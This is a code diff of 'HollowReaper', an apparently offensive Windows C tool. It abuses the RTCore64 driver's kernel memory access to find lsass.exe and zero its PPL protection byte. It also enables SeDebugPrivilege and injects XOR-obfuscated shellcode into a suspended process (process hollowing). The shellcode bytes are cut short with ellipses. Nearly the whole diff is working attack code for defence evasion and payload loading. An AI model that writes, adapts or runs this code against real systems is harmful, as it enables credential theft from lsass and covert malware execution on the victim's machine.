@@ -18,19 +18,8 @@
 #include <stdlib.h>
 #include <stdarg.h>
 #include <string.h>
+#include <tlhelp32.h>
 
-
-// =====================================================
-// Logging Functions
-// =====================================================
-void Con(const char* Message, ...) {
-    FILE* file = stderr;
-    va_list Args;
-    va_start(Args, Message);
-    vfprintf(file, Message, Args);
-    fputc('\n', file);
-    va_end(Args);
-}
 
 // =====================================================
 // Memory Access Primitives via RTCore64
@@ -514,23 +503,23 @@ void static disablePPL() {
 
     Offsets offs = getOffsets();
     if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
-        printf("[!]Offset not mapped... exiting!");
+        printf("[!]Offset not mapped... exiting!\n");
         exit(1);
     }
 
     HANDLE Device = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
     if (Device == INVALID_HANDLE_VALUE) {
-        Con("[!] Unable to obtain a handle to the device object");
+        printf("[!] Unable to obtain a handle to the device object\n");
         return;
     }
-    Con("[*] Device handle obtained");
+    printf("[*] Device handle obtained\n");
 
     unsigned long long ntoskrnlBase = getKBAddr();
-    Con("[*] ntoskrnl.exe base address: 0x%llx", ntoskrnlBase);
+    printf("[*] ntoskrnl.exe base address: 0x%llx\n", ntoskrnlBase);
 
     HMODULE hNtoskrnl = LoadLibraryW(L"ntoskrnl.exe");
     if (!hNtoskrnl) {
-        Con("[!] Failed to load ntoskrnl.exe");
+        printf("[!] Failed to load ntoskrnl.exe\n");
         CloseHandle(Device);
         return;
     }
@@ -540,7 +529,7 @@ void static disablePPL() {
 
     // Retrieve the address of the System process's EPROCESS
     DWORD64 SystemProcessEPROCESS = ReadMemoryDWORD64(Device, ntoskrnlBase + PsInitialSystemProcessOffset);
-    Con("[*] PsInitialSystemProcess (EPROCESS) address: 0x%llx", SystemProcessEPROCESS);
+    printf("[*] PsInitialSystemProcess (EPROCESS) address: 0x%llx\n", SystemProcessEPROCESS);
 
     // Calculate the list head (located within the EPROCESS)
     DWORD64 ListHead = SystemProcessEPROCESS + offs.ActiveProcessLinks;
@@ -556,19 +545,19 @@ void static disablePPL() {
         imageName[15] = '\0';
 
         if (_stricmp(imageName, "lsass.exe") == 0) {
-            Con("[*] Found EPROCESS at 0x%llx", eprocess);
+            printf("[*] Found EPROCESS at 0x%llx\n", eprocess);
             // Read the protection byte (PPL) from the EPROCESS
             BYTE protection = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
-            Con("[*] Protection value: 0x%02X", protection);
+            printf("[*] Protection value: 0x%02X\n", protection);
 
             // To disable PPL, write 0x00 into this field.
             // Warning: perform this operation only if you are sure the offsets are correct.
             WriteMemoryPrimitive(Device, 1, eprocess + offs.Protection, 0x00);
-            Con("[*] PPL disabled (0x00 written).");
+            printf("[*] PPL disabled (0x00 written)\n");
 
             // Read the protection byte (PPL) from the EPROCESS again
             BYTE protection_post = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
-            Con("[*] Protection value after write: 0x%02X", protection_post);
+            printf("[*] Protection value after write: 0x%02X\n", protection_post);
 
             break;
         }
@@ -585,6 +574,34 @@ void static disablePPL() {
 int main(int argc, char* argv[]) {
     // Start
     printf("[*] Starting HollowReaper\n");
+
+    // Enabling SeDebugPrivilege
+    HANDLE hToken = NULL;
+    LUID luid;
+    TOKEN_PRIVILEGES tp;
+    BOOL bResult;
+
+    printf("[*] Requesting SeDebugPrivilege...\n");
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        printf("[!] OpenProcessToken failed, error: %lu\n", GetLastError());
+        return 1;
+    }
+    if (!LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid)) {
+        printf("[!] LookupPrivilegeValue failed, error: %lu\n", GetLastError());
+        return 1;
+    }
+    tp.PrivilegeCount = 1;
+    tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
+    tp.Privileges->Luid = luid;
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
+        printf("[!] AdjustTokenPrivileges failed, error: %lu\n", GetLastError());
+        return 1;
+    }
+    if (GetLastError() != ERROR_SUCCESS) {
+        printf("[!] AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
+        return 1;
+    }
+    printf("[*] SeDebugPrivilege enabled.\n");
 
     // Load kernel32.dll and ntdll.dll, then deobfuscate API names
     HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
@@ -660,6 +677,7 @@ int main(int argc, char* argv[]) {
     }
 
     // Create the process in a suspended state
+    
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -672,6 +690,8 @@ int main(int argc, char* argv[]) {
     }
     free(exePathW);
     printf("[*] Process created in suspended state, PID: %lu\n", pi.dwProcessId);
+    
+
 
     // Retrieve the PEB via ZwQueryInformationProcess
     typedef struct _PROCESS_BASIC_INFORMATION {
@@ -714,7 +734,7 @@ int main(int argc, char* argv[]) {
 
     // Prepare and write the shellcode (deobfuscated via XOR) into the EntryPoint
     unsigned char shellcode_enc[] = {
-        0xD8, 0xF1, 0x6B, 0x33,...
+        0xD8, 0xF1, 0x67, 0x33, ...
     };
     size_t shellcode_len = sizeof(shellcode_enc);
     // Deobfuscate the shellcode
